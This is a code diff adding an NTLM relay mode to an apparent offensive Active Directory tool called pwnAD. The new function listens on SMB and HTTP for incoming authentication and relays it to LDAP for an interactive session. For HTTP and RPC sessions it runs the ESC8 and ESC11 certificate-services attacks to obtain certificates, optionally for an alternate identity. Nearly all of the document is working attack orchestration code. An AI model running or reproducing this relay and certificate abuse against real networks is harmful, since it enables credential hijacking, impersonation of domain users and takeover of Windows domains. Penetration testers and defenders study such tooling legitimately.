@@ -7,6 +7,89 @@ import pwnAD.lib.parser as parser
 import pwnAD.lib.logger as logger
 
 
+def _run_relay_mode(options):
+    """Start NTLM relay mode: listen for incoming auth, relay to target, inject into pwnAD."""
+    from pwnAD.lib.relay import RelayManager, handle_relay_session, exploit_esc8, exploit_esc11
+
+    if not options.relay_target:
+        logging.error('Relay mode requires a target: --relay -t ldaps://dc01.domain.local')
+        sys.exit(1)
+
+    target = options.relay_target
+
+    manager = RelayManager(
+        target=target,
+        listen_host=options.relay_host,
+        smb_port=options.smb_port,
+        http_port=options.http_port,
+        disable_smb=options.relay_no_smb,
+        disable_http=options.relay_no_http,
+        domain=getattr(options, 'domain', None),
+        adcs_template=getattr(options, 'relay_template', None),
+        adcs_ca=getattr(options, 'relay_ca', None),
+        adcs_alt_name=getattr(options, 'relay_alt_name', None),
+    )
+
+    manager.start()
+    logging.info('[*] Waiting for incoming connections...')
+
+    try:
+        while True:
+            session = manager.get_session(timeout=2)
+            if session is None:
+                continue
+
+            sess_type = session['type']
+            user = f"{session.get('domain', '?')}\\{session.get('username', '?')}"
+
+            if sess_type == 'ldap':
+                logging.info(f'[+] LDAP session from {user}')
+                conn = handle_relay_session(session, domain=getattr(options, 'domain', None))
+                if options.web:
+                    from pwnAD.web.app import start_web
+                    start_web(conn, host=options.web_host, port=options.web_port)
+                    break
+                else:
+                    start_interactive_mode(conn)
+                    break
+
+            elif sess_type == 'http':
+                logging.info(f'[+] HTTP session from {user} - running ESC8')
+                ca_name = getattr(options, 'relay_ca', None) or 'CA'
+                template = getattr(options, 'relay_template', None)
+                alt_name = getattr(options, 'relay_alt_name', None)
+                try:
+                    pfx_path, cert, key = exploit_esc8(
+                        session['client'], ca_name=ca_name,
+                        template=template, alt_name=alt_name,
+                    )
+                    logging.info(f'[+] ESC8 complete: {pfx_path}')
+                except Exception as e:
+                    logging.error(f'[-] ESC8 failed: {e}')
+
+            elif sess_type == 'rpc':
+                logging.info(f'[+] RPC session from {user} - running ESC11')
+                ca_name = getattr(options, 'relay_ca', None)
+                if not ca_name:
+                    logging.error('[-] ESC11 requires --relay-ca')
+                    continue
+                template = getattr(options, 'relay_template', None)
+                alt_name = getattr(options, 'relay_alt_name', None)
+                try:
+                    pfx_path, cert, key = exploit_esc11(
+                        session['dce'], ca_name=ca_name,
+                        template=template, alt_name=alt_name,
+                    )
+                    logging.info(f'[+] ESC11 complete: {pfx_path}')
+                except Exception as e:
+                    logging.error(f'[-] ESC11 failed: {e}')
+
+    except KeyboardInterrupt:
+        logging.info('[*] Relay stopped by user')
+    finally:
+        manager.stop()
+
+
 
 def main():
     logger.init()
@@ -16,6 +99,11 @@ def main():
         logging.getLogger().setLevel(logging.DEBUG)
     else:
         logging.getLogger().setLevel(logging.INFO)
+
+    # Relay mode — no LDAP auth needed, relay handles auth
+    if getattr(options, 'relay', False):
+        _run_relay_mode(options)
+        return
 
     if options.dc_ip is None:
         return "You need to specify a target with --dc-ip"
